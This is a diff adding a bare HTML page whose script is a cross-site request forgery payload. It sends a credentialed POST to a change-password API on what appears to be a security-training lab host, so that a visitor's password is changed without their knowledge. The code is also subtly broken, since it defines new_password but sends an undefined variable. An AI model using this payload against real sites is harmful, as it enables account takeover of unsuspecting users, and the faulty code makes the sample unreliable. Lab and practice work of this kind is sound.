@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <script>
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                console.log('ok');
+
+            }
+        }
+
+        xhttp.open("POST", "https://60ntsjhgem.voorivex-lab.online/api/change-password");
+        xhttp.setRequestHeader('Content-type', 'text/plain');
+        xhttp.withCredentials = true;
+        var new_password = "111";
+        xhttp.send("newPassword=" + encodeURIComponent(password));
+    </script>
+
+</body>
+
+</html>
